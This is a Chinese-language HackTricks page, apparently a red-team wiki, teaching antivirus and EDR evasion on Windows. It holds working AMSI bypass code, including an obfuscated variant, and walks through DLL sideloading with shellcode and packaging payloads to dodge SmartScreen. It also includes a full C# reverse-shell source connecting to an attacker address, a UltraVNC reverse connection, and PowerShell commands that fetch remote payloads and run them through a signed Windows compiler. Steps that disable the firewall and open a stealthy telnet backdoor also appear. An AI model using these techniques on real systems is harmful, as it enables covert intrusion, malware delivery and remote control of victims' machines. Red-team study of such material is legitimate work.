# Antivirus (AV) Bypass

{% hint style="success" %}
学习和实践 AWS 黑客技术：<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
学习和实践 GCP 黑客技术：<img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **在** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** 上关注我们。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 分享黑客技巧。

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

如果你对 **黑客职业** 感兴趣并想要攻克不可攻克的目标 - **我们正在招聘！** (_需要流利的波兰语书写和口语能力_).

{% embed url="https://www.stmcyber.com/careers" %}

**本页面由** [**@m2rc\_p**](https://twitter.com/m2rc\_p)**撰写！**

## **AV 规避方法论**

目前，AV 使用不同的方法来检查文件是否恶意，包括静态检测、动态分析，以及对于更高级的 EDR，行为分析。

### **静态检测**

静态检测是通过标记已知的恶意字符串或字节数组在二进制文件或脚本中实现的，同时还提取文件本身的信息（例如文件描述、公司名称、数字签名、图标、校验和等）。这意味着使用已知的公共工具可能更容易被捕获，因为它们可能已经被分析并标记为恶意。有几种方法可以绕过这种检测：

* **加密**

如果你加密了二进制文件，AV 将无法检测到你的程序，但你需要某种加载程序来解密并在内存中运行程序。

* **混淆**

有时你只需要更改二进制文件或脚本中的一些字符串就可以通过 AV，但这可能是一个耗时的任务，具体取决于你想要混淆的内容。

* **自定义工具**

如果你开发自己的工具，将不会有已知的恶意签名，但这需要大量的时间和精力。

{% hint style="info" %}
检查 Windows Defender 静态检测的一个好方法是 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)。它基本上将文件分成多个部分，然后让 Defender 分别扫描每个部分，这样可以准确告诉你在二进制文件中标记的字符串或字节。
{% endhint %}

我强烈建议你查看这个 [YouTube 播放列表](https://www.youtube.com/playlist?list=PLj05gPj8rk\_pkb12mDe4PgYZ5qPxhGKGf) 关于实用的 AV 规避。

### **动态分析**

动态分析是指 AV 在沙箱中运行你的二进制文件并监视恶意活动（例如，尝试解密并读取浏览器的密码，执行 LSASS 的小型转储等）。这一部分可能更难处理，但这里有一些你可以做的事情来规避沙箱。

* **执行前休眠** 根据实现方式，这可能是绕过 AV 动态分析的好方法。AV 扫描文件的时间非常短，以免打断用户的工作流程，因此使用长时间的休眠可以干扰二进制文件的分析。问题是许多 AV 的沙箱可以根据实现方式跳过休眠。
* **检查机器资源** 通常沙箱可用的资源非常少（例如 < 2GB RAM），否则它们可能会减慢用户的机器。你也可以在这里发挥创造力，例如检查 CPU 的温度或风扇速度，并不是所有内容都会在沙箱中实现。
* **特定机器检查** 如果你想针对加入 "contoso.local" 域的用户的工作站，你可以检查计算机的域以查看是否与指定的域匹配，如果不匹配，你可以让程序退出。

事实证明，Microsoft Defender 的沙箱计算机名是 HAL9TH，因此，你可以在恶意软件引爆前检查计算机名，如果名称匹配 HAL9TH，则意味着你在 Defender 的沙箱中，因此可以让程序退出。

<figure><img src="../.gitbook/assets/image (209).png" alt=""><figcaption><p>来源: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

一些来自 [@mgeeky](https://twitter.com/mariuszbit) 的非常好的针对沙箱的建议

<figure><img src="../.gitbook/assets/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">红队 VX Discord</a> #malware-dev 频道</p></figcaption></figure>

正如我们在这篇文章中之前所说的，**公共工具**最终会被 **检测到**，所以你应该问自己一个问题：

例如，如果你想转储 LSASS，**你真的需要使用 mimikatz 吗**？或者你可以使用一个不太知名的项目来转储 LSASS。

正确的答案可能是后者。以 mimikatz 为例，它可能是被 AV 和 EDR 标记的最多的恶意软件之一，尽管该项目本身非常酷，但在绕过 AV 时使用它也是一场噩梦，因此只需寻找替代方案来实现你的目标。

{% hint style="info" %}
在修改你的有效载荷以进行规避时，请确保 **关闭 Defender 的自动样本提交**，并且请认真考虑，**如果你的目标是长期规避，请不要上传到 VIRUSTOTAL**。如果你想检查你的有效载荷是否被特定 AV 检测到，请在虚拟机上安装它，尝试关闭自动样本提交，并在那里进行测试，直到你对结果满意为止。
{% endhint %}

## EXEs 与 DLLs

每当可能时，总是 **优先使用 DLL 进行规避**，根据我的经验，DLL 文件通常 **被检测和分析的概率要低得多**，因此在某些情况下使用它来避免检测是一个非常简单的技巧（当然前提是你的有效载荷有某种方式以 DLL 的形式运行）。

正如我们在这张图片中看到的，Havoc 的 DLL 有效载荷在 antiscan.me 上的检测率为 4/26，而 EXE 有效载荷的检测率为 7/26。

<figure><img src="../.gitbook/assets/image (1130).png" alt=""><figcaption><p>antiscan.me 上普通 Havoc EXE 有效载荷与普通 Havoc DLL 的比较</p></figcaption></figure>

现在我们将展示一些你可以使用 DLL 文件的技巧，以便更加隐蔽。

## DLL 侧载与代理

**DLL 侧载** 利用加载程序使用的 DLL 搜索顺序，通过将受害者应用程序和恶意有效载荷并排放置来实现。

你可以使用 [Siofra](https://github.com/Cybereason/siofra) 和以下 PowerShell 脚本检查易受 DLL 侧载影响的程序：

{% code overflow="wrap" %}
```powershell
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
{% endcode %}

此命令将输出“C:\Program Files\\”中易受DLL劫持的程序列表及其尝试加载的DLL文件。

我强烈建议你**自己探索可被DLL劫持/侧载的程序**，如果正确执行，这种技术相当隐蔽，但如果你使用公开已知的DLL侧载程序，可能会很容易被抓住。

仅仅放置一个恶意DLL，其名称是程序期望加载的，并不会加载你的有效载荷，因为程序期望该DLL中有一些特定的函数。为了解决这个问题，我们将使用另一种技术，称为**DLL代理/转发**。

**DLL代理**将程序从代理（和恶意）DLL发出的调用转发到原始DLL，从而保留程序的功能，并能够处理你的有效载荷的执行。

我将使用[@flangvik](https://twitter.com/Flangvik/)的[SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy)项目。

以下是我遵循的步骤：

{% code overflow="wrap" %}
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
{% endcode %}

最后一个命令将给我们两个文件：一个 DLL 源代码模板和重命名后的原始 DLL。

<figure><img src="../.gitbook/assets/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
{% endcode %}

这些是结果：

<figure><img src="../.gitbook/assets/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

我们的 shellcode（使用 [SGN](https://github.com/EgeBalci/sgn) 编码）和代理 DLL 在 [antiscan.me](https://antiscan.me) 上的检测率为 0/26！我会称之为成功。

<figure><img src="../.gitbook/assets/image (193).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
我 **强烈推荐** 你观看 [S3cur3Th1sSh1t 的 twitch VOD](https://www.twitch.tv/videos/1644171543) 关于 DLL 侧载，以及 [ippsec 的视频](https://www.youtube.com/watch?v=3eROsG\_WNpE) 以更深入地了解我们讨论的内容。
{% endhint %}

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze 是一个用于通过挂起进程、直接系统调用和替代执行方法绕过 EDR 的有效载荷工具包`

你可以使用 Freeze 以隐秘的方式加载和执行你的 shellcode。
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../.gitbook/assets/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
规避只是猫和老鼠的游戏，今天有效的方法明天可能会被检测到，因此永远不要仅依赖一个工具，如果可能，尝试将多个规避技术结合起来。
{% endhint %}

## AMSI（反恶意软件扫描接口）

AMSI的创建是为了防止“[无文件恶意软件](https://en.wikipedia.org/wiki/Fileless\_malware)”。最初，AV只能扫描**磁盘上的文件**，因此如果你能够以某种方式**直接在内存中执行有效载荷**，AV就无法采取任何措施来阻止它，因为它没有足够的可见性。

AMSI功能集成在Windows的以下组件中。

* 用户帐户控制，或UAC（提升EXE、COM、MSI或ActiveX安装）
* PowerShell（脚本、交互使用和动态代码评估）
* Windows脚本主机（wscript.exe和cscript.exe）
* JavaScript和VBScript
* Office VBA宏

它允许杀毒软件通过以未加密和未混淆的形式暴露脚本内容来检查脚本行为。

运行 `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` 将在Windows Defender上产生以下警报。

<figure><img src="../.gitbook/assets/image (1135).png" alt=""><figcaption></figcaption></figure>

注意它是如何在前面加上 `amsi:` 然后是脚本运行的可执行文件的路径，在这种情况下是powershell.exe。

我们没有将任何文件写入磁盘，但仍然因为AMSI在内存中被捕获。

有几种方法可以绕过AMSI：

* **混淆**

由于AMSI主要依赖静态检测，因此修改你尝试加载的脚本可能是规避检测的好方法。

然而，AMSI有能力解混淆脚本，即使它有多层，因此混淆可能是一个糟糕的选择，具体取决于其实现方式。这使得规避变得不那么简单。尽管有时，你所需要做的只是更改几个变量名称，你就可以成功，因此这取决于某个内容被标记的程度。

* **AMSI绕过**

由于AMSI是通过将DLL加载到powershell（也包括cscript.exe、wscript.exe等）进程中来实现的，因此即使以非特权用户身份运行，也可以轻松篡改它。由于AMSI实现中的这个缺陷，研究人员发现了多种规避AMSI扫描的方法。

**强制错误**

强制AMSI初始化失败（amsiInitFailed）将导致当前进程不会启动扫描。最初这是由[Matt Graeber](https://twitter.com/mattifestation)披露的，微软已经开发了一个签名以防止更广泛的使用。

{% code overflow="wrap" %}
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
{% endcode %}

只需一行 PowerShell 代码就可以使当前 PowerShell 进程无法使用 AMSI。 当然，这一行已经被 AMSI 本身标记，因此需要进行一些修改才能使用此技术。

这是我从这个 [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) 中获取的修改版 AMSI 绕过。
```powershell
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
请记住，这篇文章发布后可能会被标记，因此如果你的计划是保持隐蔽，就不应该发布任何代码。

**内存补丁**

该技术最初是由 [@RastaMouse](https://twitter.com/\_RastaMouse/) 发现的，它涉及在 amsi.dll 中找到 "AmsiScanBuffer" 函数的地址（负责扫描用户提供的输入），并用返回 E\_INVALIDARG 代码的指令覆盖它，这样，实际扫描的结果将返回 0，这被解释为干净的结果。

{% hint style="info" %}
请阅读 [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) 以获取更详细的解释。
{% endhint %}

还有许多其他技术可以通过 PowerShell 绕过 AMSI，查看 [**此页面**](basic-powershell-for-pentesters/#amsi-bypass) 和 [此仓库](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) 以了解更多信息。

或者这个脚本通过内存补丁将补丁应用于每个新的 PowerShell。

## 混淆

有几种工具可以用来 **混淆 C# 明文代码**，生成 **元编程模板** 以编译二进制文件或 **混淆已编译的二进制文件**，例如：

* [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# 混淆器**
* [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): 该项目的目标是提供一个开源的 LLVM 编译套件分支，能够通过 [代码混淆](http://en.wikipedia.org/wiki/Obfuscation\_\(software\)) 和防篡改提供增强的软件安全性。
* [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator 演示如何使用 `C++11/14` 语言在编译时生成混淆代码，而无需使用任何外部工具且不修改编译器。
* [**obfy**](https://github.com/fritzone/obfy): 添加一层由 C++ 模板元编程框架生成的混淆操作，这将使想要破解应用程序的人稍微困难一些。
* [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz 是一个 x64 二进制混淆器，能够混淆各种不同的 pe 文件，包括：.exe, .dll, .sys
* [**metame**](https://github.com/a0rtega/metame): Metame 是一个简单的变形代码引擎，适用于任意可执行文件。
* [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator 是一个细粒度的代码混淆框架，适用于使用 ROP（面向返回的编程）的 LLVM 支持语言。ROPfuscator 通过将常规指令转换为 ROP 链，在汇编代码级别混淆程序，阻碍我们对正常控制流的自然概念。
* [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt 是一个用 Nim 编写的 .NET PE 加密器。
* [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor 能够将现有的 EXE/DLL 转换为 shellcode，然后加载它们。

## SmartScreen 和 MoTW

你可能在从互联网下载某些可执行文件并执行它们时见过这个屏幕。

Microsoft Defender SmartScreen 是一种安全机制，旨在保护最终用户免受运行潜在恶意应用程序的影响。

<figure><img src="../.gitbook/assets/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen 主要采用基于声誉的方法，这意味着不常下载的应用程序将触发 SmartScreen，从而警告并阻止最终用户执行该文件（尽管可以通过点击更多信息 -> 无论如何运行来执行该文件）。

**MoTW**（网络标记）是一个 [NTFS 备用数据流](https://en.wikipedia.org/wiki/NTFS#Alternate\_data\_stream\_\(ADS\))，其名称为 Zone.Identifier，下载来自互联网的文件时会自动创建，并附带下载的 URL。

<figure><img src="../.gitbook/assets/image (237).png" alt=""><figcaption><p>检查从互联网下载的文件的 Zone.Identifier ADS。</p></figcaption></figure>

{% hint style="info" %}
重要的是要注意，使用 **受信任** 签名证书签名的可执行文件 **不会触发 SmartScreen**。
{% endhint %}

防止你的有效载荷获得网络标记的一个非常有效的方法是将它们打包在某种容器中，例如 ISO。这是因为网络标记（MOTW） **不能** 应用于 **非 NTFS** 卷。

<figure><img src="../.gitbook/assets/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) 是一个将有效载荷打包到输出容器中的工具，以规避网络标记。

示例用法：
```powershell
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
这里是一个演示，通过使用 [PackMyPayload](https://github.com/mgeeky/PackMyPayload/) 将有效负载打包在 ISO 文件中来绕过 SmartScreen。

<figure><img src="../.gitbook/assets/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## C# 程序集反射

在内存中加载 C# 二进制文件已经被知道了一段时间，这仍然是运行后渗透工具而不被 AV 捕获的非常好方法。

由于有效负载将直接加载到内存中而不接触磁盘，我们只需担心在整个过程中修补 AMSI。

大多数 C2 框架（sliver、Covenant、metasploit、CobaltStrike、Havoc 等）已经提供了直接在内存中执行 C# 程序集的能力，但有不同的方法来做到这一点：

* **Fork\&Run**

这涉及到 **生成一个新的牺牲进程**，将你的后渗透恶意代码注入到那个新进程中，执行你的恶意代码，完成后杀死新进程。这有其优点和缺点。Fork 和 run 方法的好处在于执行发生在 **我们的 Beacon 植入进程之外**。这意味着如果我们的后渗透操作中的某些事情出错或被捕获，我们的 **植入物存活的机会更大**。缺点是你有 **更大的机会** 被 **行为检测** 捕获。

<figure><img src="../.gitbook/assets/image (215).png" alt=""><figcaption></figcaption></figure>

* **Inline**

这涉及将后渗透恶意代码 **注入到其自身进程中**。这样，你可以避免创建新进程并让其被 AV 扫描，但缺点是如果你的有效负载执行出现问题，**失去你的 beacon 的机会更大**，因为它可能崩溃。

<figure><img src="../.gitbook/assets/image (1136).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
如果你想了解更多关于 C# 程序集加载的信息，请查看这篇文章 [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) 和他们的 InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))
{% endhint %}

你还可以 **从 PowerShell 加载 C# 程序集**，查看 [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) 和 [S3cur3th1sSh1t 的视频](https://www.youtube.com/watch?v=oe11Q-3Akuk)。

## 使用其他编程语言

正如在 [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) 中提出的，可以通过让被攻陷的机器访问 **攻击者控制的 SMB 共享上的解释器环境** 来使用其他语言执行恶意代码。

通过允许访问 SMB 共享上的解释器二进制文件和环境，你可以 **在被攻陷机器的内存中执行这些语言的任意代码**。

该仓库指出：Defender 仍然会扫描脚本，但通过利用 Go、Java、PHP 等，我们有 **更多的灵活性来绕过静态签名**。使用这些语言中的随机未混淆反向 shell 脚本进行测试已证明成功。

## 高级规避

规避是一个非常复杂的话题，有时你必须考虑一个系统中许多不同的遥测来源，因此在成熟环境中完全不被检测几乎是不可能的。

你所面对的每个环境都有其自身的优缺点。

我强烈建议你观看 [@ATTL4S](https://twitter.com/DaniLJ94) 的这场演讲，以了解更多高级规避技术。

{% embed url="https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo" %}

这也是 [@mariuszbit](https://twitter.com/mariuszbit) 关于深入规避的另一场精彩演讲。

{% embed url="https://www.youtube.com/watch?v=IbA7Ung39o4" %}

## **旧技术**

### **检查 Defender 发现的恶意部分**

你可以使用 [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck)，它将 **删除二进制文件的部分**，直到 **找出 Defender** 发现的恶意部分并将其分离给你。\
另一个做 **同样事情的工具是** [**avred**](https://github.com/dobin/avred)，它提供了一个开放的网络服务，地址为 [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet 服务器**

直到 Windows 10，所有 Windows 都附带一个 **Telnet 服务器**，你可以通过以下方式安装（作为管理员）：
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
使其在系统启动时**启动**并**立即运行**：
```bash
sc config TlntSVR start= auto obj= localsystem
```
**更改telnet端口** (隐蔽) 并禁用防火墙:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

从以下地址下载: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html)（你需要的是二进制下载，而不是安装程序）

**在主机上**: 执行 _**winvnc.exe**_ 并配置服务器:

* 启用选项 _Disable TrayIcon_
* 在 _VNC Password_ 中设置密码
* 在 _View-Only Password_ 中设置密码

然后，将二进制文件 _**winvnc.exe**_ 和 **新创建的** 文件 _**UltraVNC.ini**_ 移动到 **受害者** 机器中

#### **反向连接**

**攻击者**应在其 **主机** 中执行二进制文件 `vncviewer.exe -listen 5900`，以便 **准备** 捕获反向 **VNC 连接**。然后，在 **受害者** 中: 启动 winvnc 守护进程 `winvnc.exe -run` 并运行 `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**警告:** 为了保持隐蔽性，你必须避免以下几件事

* 如果 `winvnc` 已经在运行，不要再次启动它，否则会触发 [弹出窗口](https://i.imgur.com/1SROTTl.png)。使用 `tasklist | findstr winvnc` 检查它是否在运行
* 如果没有 `UltraVNC.ini` 在同一目录中，不要启动 `winvnc`，否则会导致 [配置窗口](https://i.imgur.com/rfMQWcf.png) 打开
* 不要运行 `winvnc -h` 获取帮助，否则会触发 [弹出窗口](https://i.imgur.com/oc18wcu.png)

### GreatSCT

从以下地址下载: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
在 GreatSCT 内部：
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
现在 **启动监听器** 使用 `msfconsole -r file.rc` 并 **执行** **xml 负载** 使用：
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**当前的防御者会非常快速地终止进程。**

### 编译我们自己的反向 shell

https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 第一个 C# 反向 shell

使用以下命令编译：
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
使用它与：
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# 使用编译器
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
自动下载和执行：
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{% embed url="https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f" %}

C# 混淆器列表: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
* [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
* [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
* [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
* [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
* [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### 使用 Python 构建注入器示例：

* [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### 其他工具
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### 更多

* [https://github.com/persianhydra/Xeexe-TopAntivirusEvasion](https://github.com/persianhydra/Xeexe-TopAntivirusEvasion)

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

如果你对**黑客职业**感兴趣并想要攻克不可攻克的目标 - **我们正在招聘！**（_需要流利的波兰语书写和口语能力_）。

{% embed url="https://www.stmcyber.com/careers" %}

{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
学习与实践 GCP 黑客技术：<img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
